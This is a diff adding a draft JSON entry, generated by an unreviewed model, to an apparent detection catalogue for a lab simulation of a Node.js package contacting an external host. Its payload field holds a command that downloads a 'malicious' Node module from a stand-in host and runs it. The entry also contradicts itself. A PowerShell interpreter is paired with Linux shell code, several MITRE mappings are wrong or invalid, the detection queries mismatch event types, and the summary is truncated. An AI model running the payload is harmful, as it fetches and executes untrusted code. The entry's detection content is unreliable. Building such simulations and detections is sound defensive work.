@@ -1,0 +1,186 @@
+{
+  "id": "TTP-0000-0266",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Node.js Package Communication to External Host",
+    "summary": "An attacker uses a Node.js package to initiate outbound communication to an external host, triggering an ABIOC for uncommon package behavior. Cortex should detect the process start and network connect",
+    "description": "An attacker uses a Node.js package to initiate outbound communication to an external host, triggering an ABIOC for uncommon package behavior. Cortex should detect the process start and network connection."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1059",
+        "subtechnique_id": "T1059.008",
+        "name": "T1059.008",
+        "tactic_ids": [
+          "TA0000"
+        ]
+      },
+      {
+        "technique_id": "T1071",
+        "subtechnique_id": "T1071.004",
+        "name": "Application Layer Protocol: DNS",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      },
+      {
+        "technique_id": "T1566",
+        "subtechnique_id": "T1566.001",
+        "name": "Phishing: Spearphishing Attachment",
+        "tactic_ids": [
+          "TA0001"
+        ],
+        "tactic_names": [
+          "Initial Access"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "mkdir -p /tmp/attack\nwget -O /tmp/attack/node_module.tar.gz https://example.com/malicious_node_module.tar.gz\nmkdir -p /tmp/attack/node_modules\n tar -xzf /tmp/attack/node_module.tar.gz -C /tmp/attack/node_modules\nnode /tmp/attack/node_modules/malicious_script.js\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "Node.js process execution",
+        "expected_value": "action_process_image_name = 'node'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Outbound network connection to external host",
+        "expected_value": "action_remote_ip = '192.0.2.10'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Uncommon Node.js package initiated communication",
+        "description": "Detection of Node.js process starting and connecting to external host",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'node'\n| filter action_remote_ip = '192.0.2.10'",
+        "mitre_technique_ids": [
+          "T1059.008",
+          "T1071.004"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Uncommon Node.js package initiated communication",
+        "description": "Behavioral deviation where Node.js package initiates communication to external host",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'node'\n| filter action_remote_ip = '192.0.2.10'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "node process start with outbound connection",
+        "mitre_technique_ids": [
+          "T1059.008",
+          "T1071.004"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Node.js outbound communication",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK_CONNECTION\n| filter action_process_image_name = 'node'\n| filter action_remote_ip = '192.0.2.10'",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Uncommon Node.js package initiated communication to an external host; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/uncommon-node-js-package-initiated-communication-to-an-external-host"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Uncommon Node.js package initiated communication to an external host",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/uncommon-node-js-package-initiated-communication-to-an-external-host",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1059.008",
+      "url": "https://attack.mitre.org/techniques/T1059/008/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1071.004",
+      "url": "https://attack.mitre.org/techniques/T1071/004/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1566.001",
+      "url": "https://attack.mitre.org/techniques/T1566/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
